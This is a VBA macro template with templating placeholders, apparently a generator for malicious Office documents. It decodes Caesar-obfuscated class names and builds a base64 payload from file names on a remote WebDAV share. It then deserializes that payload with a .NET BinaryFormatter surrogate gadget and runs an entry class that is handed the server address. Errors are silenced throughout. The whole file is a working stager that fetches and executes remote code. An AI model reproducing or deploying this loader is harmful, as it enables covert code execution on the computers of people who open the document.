Public ${varWebDavServer} As String

'-------------------------------------------------------------
Sub Go()
    Init
    Run
End Sub

'-------------------------------------------------------------
Sub Init()
    ${varWebDavServer} = ""
    ${varWebDavServer} = ${funcInvertCaesar}(${caesarKey},"${webDavServer}")
End Sub
                                                                                                                               
'-------------------------------------------------------------
Function Run()
    On Error Resume Next
    
    ${varEntryClass} = ${funcInvertCaesar}(${caesarKey}, "${entryClass}")
                                                                                                                                            
    Dim stm As Object, fmt As Object, al As Object
    Set stm = CreateObject(${funcInvertCaesar}(${caesarKey}, "${memoryStream}"))
    Set fmt = CreateObject(${funcInvertCaesar}(${caesarKey}, "${binaryFormatter}"))
    Set al = CreateObject(${funcInvertCaesar}(${caesarKey}, "${arrayList}"))
                                                                                                                                            
    Dim bytes() As Byte
    bytes = Base64Decode(LoadTemplates("serialized"))
    
    For Each i In bytes
        stm.WriteByte i
    Next i
                                                                                                                                            
    stm.Position = 0
                                                                                                                                            
    Dim n As Object, d As Object, o As Object
    Set n = fmt.SurrogateSelector
    Set d = fmt.Deserialize_2(stm)
    al.Add n
                                                                                                                                            
    Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(${varEntryClass})
    o.goFight ${varWebDavServer}

End Function

'-------------------------------------------------------------
Private Function LoadTemplates(ByVal template As String)
    Dim tmp As String, result As String
    Dim flag As Boolean
   
    tmp = Dir("\\" & ${varWebDavServer} & "\" & template & "\", vbNormal)
    
    flag = True
    While flag = True
        If tmp = "" Then
            flag = False
        Else
            result = result + tmp
            tmp = Dir
        End If
    Wend
    
    result = Replace(result, vbCrLf, "")
    result = Replace(result, "_", "/")
    LoadTemplates = result

End Function

'-------------------------------------------------------------
Private Function ${funcInvertCaesar}(ByVal k As Integer, ByVal data As String)
    Dim i, n, s As Integer
    Dim result As String
    
    For i = 1 To Len(data)
        n = Asc(Mid(data, i, 1))
        s = n - k
        If s < 32 Then
            s = s + 94
            End If
        Mid(data, i, 1) = Chr(s)
    Next
    ${funcInvertCaesar} = data
End Function

'-------------------------------------------------------------
Private Function Base64Decode(s)
    Set xmlObj = CreateObject("MSXml2.DOMDocument")
    Set docElement = xmlObj.createElement("Base64Data")
    docElement.dataType = "bin.base64"
    docElement.Text = s
    Base64Decode = docElement.nodeTypedValue
End Function
